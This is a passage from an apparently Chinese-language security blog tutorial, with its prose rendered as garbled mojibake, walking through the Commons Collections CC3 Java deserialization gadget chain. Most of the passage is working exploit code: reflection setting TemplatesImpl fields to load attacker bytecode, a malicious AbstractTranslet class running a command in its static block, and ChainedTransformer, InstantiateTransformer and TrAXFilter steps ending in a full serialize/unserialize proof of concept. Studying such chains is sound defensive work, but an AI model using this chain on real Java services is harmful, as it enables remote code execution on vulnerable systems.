class="type">byte</span>[][])gf.get(<span class="string">"_bytecodes"</span>, <span class="literal">null</span>);</span><br><span class="line">        _class = (Class[])gf.get(<span class="string">"_class"</span>, <span class="literal">null</span>);</span><br><span class="line">        _transletIndex = gf.get(<span class="string">"_transletIndex"</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        _outputProperties = (Properties)gf.get(<span class="string">"_outputProperties"</span>, <span class="literal">null</span>);</span><br><span class="line">        _indentNumber = gf.get(<span class="string">"_indentNumber"</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is.readBoolean()) {</span><br><span class="line">            _uriResolver = (URIResolver) is.readObject();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        _tfactory = <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬å…ˆä¸è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œæˆ‘ä»¬å…ˆç”¨åå°„ä¿®æ”¹_tfactoryçš„å€¼ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½å¼¹è®¡ç®—å™¨ï¼ˆè¿™é‡Œæˆ‘ä»¬å¹¶æ²¡æœ‰è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œæ‰€ä»¥å…¶å®å°±æ˜¯ç”¨åå°„ä¿®æ”¹äº†ä¸ªå€¼ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥ä¿®æ”¹æˆåŠŸçš„ï¼‰ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tmp</span> <span class="operator">=</span> templatesimpl.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templatesimpl,<span class="string">"y1"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">"/Users/y1zh3e7/Desktop/Test.class"</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = {code};</span><br><span class="line">        bytecodesField.set(templatesimpl,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfield.set(templatesimpl,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templatesimpl.newTransformer();</span><br></pre></td></tr></tbody></table></figure>

<p>æ²¡æœ‰å¼¹å‡ºæ¥è®¡ç®—å™¨ï¼Œçˆ†äº†ç©ºæŒ‡é’ˆå¼‚å¸¸ï¼Œé€šè¿‡è°ƒè¯•å‘ç°åœ¨_classæˆåŠŸåŠ è½½ç±»åï¼Œæ˜¯è¿™é‡ŒæŠ›å‡ºäº†å¼‚å¸¸ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) {</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">else</span> {</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) {</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">            }</span><br></pre></td></tr></tbody></table></figure>

<p>ç¬¬ä¸€ä¸ªifæ£€æŸ¥_classçš„çˆ¶ç±»æ˜¯å¦å«<code>ABSTRACT_TRANSLET</code> ï¼Œå¦‚æœæ²¡æœ‰è¿›å…¥åˆ°ifé‡Œé¢é‚£ä¹ˆelseä¸­çš„_auxClassesä¸ºç©ºï¼Œå°±ä¼šæŠ›ç©ºæŒ‡é’ˆï¼Œå¹¶ä¸”ä¸‹é¢ç¬¬äºŒä¸ªifä¸­ä¹Ÿä¼šæŠ›å¼‚å¸¸ï¼Œä¸ºäº†é¿å…è¿™ä¸¤ä¸ªæŠ›å¼‚å¸¸çš„ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦å°†_classåŠ è½½çš„æ¶æ„ç±»ç»§æ‰¿åä¸º<code>ABSTRACT_TRANSLET</code> çš„çˆ¶ç±»ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">ABSTRACT_TRANSLET</span></span><br><span class="line">        <span class="operator">=</span> <span class="string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>ä¿®æ”¹æ¶æ„ç±»ï¼Œç»§æ‰¿çš„çˆ¶ç±»ä¸­æœ‰ä¸¤ä¸ªæŠ½è±¡æ–¹æ³•éœ€è¦è¿›è¡Œé‡å†™ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>{</span><br><span class="line">    <span class="keyword">static</span>{</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"open -na Calculator"</span>);</span><br><span class="line">        } <span class="keyword">catch</span> (IOException e) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException {</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>ç°åœ¨å°±å¯ä»¥å¼¹å‡ºè®¡ç®—å™¨äº†ï¼Œå¦‚æœä½ è¿™é‡Œæ²¡æœ‰å¼¹å‡ºæ¥ï¼Œçœ‹ä¸€ä¸‹importçš„åŒ…æ˜¯ä¸æ˜¯æœ‰é—®é¢˜ï¼Œ<code>TemplatesImpl</code>å’Œ<code>TransformerFactoryImpl</code>çš„è·¯å¾„ä¸€å®šè¦æ˜¯com.xxxï¼Œå¦‚æœæ˜¯org.xxxæ˜¯ä¸èƒ½ç”¨çš„ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception{</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tmp</span> <span class="operator">=</span> templatesimpl.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templatesimpl,<span class="string">"y1"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">"/Users/y1zh3e7/Desktop/Test.class"</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = {code};</span><br><span class="line">        bytecodesField.set(templatesimpl,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfield.set(templatesimpl,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templatesimpl.newTransformer();</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>ä¸‹é¢æˆ‘ä»¬è¦æƒ³åŠæ³•æ‰§è¡Œ<code>templatesimpl.newTransformer</code>ï¼Œè¿™é‡Œä¾æ—§æ˜¯ç”¨CC1ä¸­ç”¨åˆ°çš„<code>InvokerTransformer.transform</code>è¿›è¡Œä»£ç çš„æ‰§è¡Œï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tmp</span> <span class="operator">=</span> templatesimpl.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templatesimpl,<span class="string">"y1"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">"/Users/y1zh3e7/Desktop/Test.class"</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = {code};</span><br><span class="line">        bytecodesField.set(templatesimpl,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfield.set(templatesimpl,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templatesimpl),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"newTransformer"</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        });</span><br><span class="line">        ctf.transform(<span class="number">1</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>å‰©ä¸‹çš„æ‰¾<code>Chainedtransformer.transform</code> çš„è°ƒç”¨ç‚¹å°±å’ŒCC1åé¢ä¸€æ ·äº†ï¼Œç›´æ¥ç²˜è¿‡æ¥å°±æ˜¯ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads.Test;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> ysoserial.payloads.util.Test.util.Serialize.serialize;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> ysoserial.payloads.util.Test.util.Unserialize.unserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception{</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tmp</span> <span class="operator">=</span> templatesimpl.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templatesimpl,<span class="string">"y1"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">"/Users/y1zh3e7/Desktop/Test.class"</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = {code};</span><br><span class="line">        bytecodesField.set(templatesimpl,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfield.set(templatesimpl,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templatesimpl),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"newTransformer"</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        });</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">"value"</span>,<span class="string">"v"</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,ctf);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerconstructor</span> <span class="operator">=</span> annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">"ser.bin"</span>);</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>ç›¸è¾ƒäºCC1æ¥è¯´ä¸€ä¸ªæ˜¯é€šè¿‡è°ƒç”¨Runtimeæ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä¸€ä¸ªæ˜¯é€šè¿‡åŠ¨æ€ç±»åŠ è½½è¿›è¡Œä»£ç æ‰§è¡Œï¼Œå¦‚æœè¿‡æ»¤äº†Runtimeæˆ‘ä»¬å°±å¯ä»¥å°è¯•ç”¨è¿™æ¡CC3</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬åœ¨æ¥è¯´ysoserialä¸Šç”¨çš„å¦ä¸€æ¡è°ƒç”¨é“¾ï¼š</p>
<p>æˆ‘ä»¬å›åˆ°<code>newTransformer</code>ï¼Œåˆšæ‰è¯´çš„æ˜¯ç”¨CC1ååŠæ®µç›´æ¥è°ƒç”¨ï¼Œæˆ‘ä»¬æ¥ç€å‘ä¸‹æ‰¾è°ƒç”¨<code>newTransformer</code> çš„åœ°æ–¹ï¼Œæœ€ç»ˆé”å®šåœ¨äº†<code>com/sun/org/apache/xalan/internal/xsltc/trax/TrAXFilter.java</code> è¿™ä¸ªç±»ä¸Šï¼Œè¿™ä¸ªç±»æ²¡æœ‰ç»§æ‰¿serializeæ¥å£ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ²¡åŠæ³•é€šè¿‡åå°„æ¥ä¿®æ”¹å®ä¾‹ä¸­å±æ€§çš„å€¼ï¼Œä½†æ˜¯æˆ‘ä»¬æƒ³åˆ°å¯¹å±æ€§å€¼è¿›è¡Œåˆå§‹åŒ–çš„æ“ä½œä¸€èˆ¬åœ¨æ„é€ å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å®ƒçš„æ„é€ å‡½æ•°ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">        TransformerConfigurationException</span><br><span class="line">    {</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">        _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">        _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªæ„é€ å‡½æ•°æ¥æ§åˆ¶è¿™ä¸ªtemplatesçš„å€¼ï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥å°±æ˜¯è¦æ‰¾å¯ä»¥è°ƒç”¨è¿™ä¸ªæ„é€ å‡½æ•°çš„åœ°æ–¹ï¼Œysoserialä¸­ç»™å‡ºäº†<code>InstantiateTransformer</code> è¿™ä¸ªç±»ï¼Œé€šè¿‡å®ƒçš„æ„é€ å‡½æ•°å’Œtransformæ–¹æ³•å¯ä»¥è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„æŒ‡å®šå‚æ•°çš„æ„é€ å‡½æ•°ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> {</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) {</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">"InstantiateTransformer: Input object was not an instanceof Class, it was a "</span> + (input == <span class="literal">null</span> ? <span class="string">"null object"</span> : input.getClass().getName()));</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class)input).getConstructor(<span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.iArgs);</span><br><span class="line">            }</span><br></pre></td></tr></tbody></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ä¸‹é¢ä¸¤è¡Œä»£ç å°±å¯ä»¥æ‰§è¡ŒnewTransformeräº†ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]{Templates.class},<span class="keyword">new</span> <span class="title class_">Object</span>[]{templatesimpl});</span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></tbody></table></figure>

<p>æœ€ç»ˆè¿˜æ˜¯ç”¨ChainedTransformeråŒ…è£¹èµ·æ¥æ‰§è¡Œï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tmp</span> <span class="operator">=</span> templatesimpl.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templatesimpl,<span class="string">"y1"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">"/Users/y1zh3e7/Desktop/Test.class"</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = {code};</span><br><span class="line">        bytecodesField.set(templatesimpl,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        tfactoryfield.setAccessible(<span 